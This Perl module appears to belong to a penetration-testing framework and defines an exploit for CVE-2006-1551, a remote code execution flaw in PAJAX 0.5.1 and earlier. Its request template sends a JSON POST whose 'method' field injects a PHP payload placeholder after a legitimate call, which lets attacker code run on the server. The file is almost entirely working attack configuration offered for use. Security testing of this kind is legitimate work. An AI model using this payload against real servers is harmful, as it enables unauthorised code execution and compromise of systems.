package PAJAX::MSF::PajaxRemoteExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "PajaxRemoteExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2006-1551",
  DESCRIPTION => "

          RedTeam has identified two security flaws in PAJAX (<= 0.5.1).

        It is possible to execute arbitrary PHP code from unchecked user input.

        Additionally, it is possible to include arbitrary files on the server

        ending in \".class.php\".

      ",
  MSF_MODULE => "pajax_remote_exec",
  OSVDB => 24618,
  REFERENCES => [
    "http://www.redteam-pentesting.de/advisories/rt-sa-2006-001.php",
  ],
  TITLE => "PAJAX Remote Command Execution",


  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => '{ "id": "bb2238f1186dad8d6370d2bab5f290f71", "className": "Calculator", "method": "add(1,1);__PAYLOAD__;\$obj->add", "params": ["1", "5"] }',
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'text/x-json',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
